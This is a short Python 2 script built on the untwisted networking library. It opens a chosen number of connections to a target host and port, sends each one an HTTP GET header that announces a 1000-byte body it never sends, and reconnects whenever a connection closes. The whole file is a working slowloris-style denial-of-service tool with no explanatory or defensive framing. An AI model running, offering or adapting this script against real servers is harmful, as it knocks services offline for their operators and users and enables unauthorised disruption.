
from untwisted.network import *
from untwisted.utils.stdio import *
from untwisted.utils.stdio import put

from random import randint
from untwisted.task import Task, COMPLETE
import sys


def connect(addr, port):
    print addr, port
    con = Spin()
    Client(con)
    con.connect_ex((addr, port))
    xmap(con, CONNECT, on_connect)
    xmap(con, CONNECT_ERR, lambda con, err: lose(con))

    def reconnect(con, err):
        connect(addr, port)

    xmap(con, CLOSE, reconnect)

    return con

def on_connect(con):
    Stdin(con)
    Stdout(con)
    
    con.dump(HTTP_HEADER)
    xmap(con, CLOSE, lambda con, err: lose(con))
    xmap(con, CLOSE, lambda con, err: sys.stdout.write('Closed\n'))

if __name__ == '__main__':
    global HTTP_HEADER

    HTTP_HEADER                  = 'GET %s HTTP/1.1\r\nContent-Length :1000\r\n\r\n'
    ADDR, PORT, MAX, HTTP_HEADER = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), HTTP_HEADER % sys.argv[4]

    for ind in xrange(MAX):
        con = connect(ADDR, PORT)    

    core.gear.mainloop()










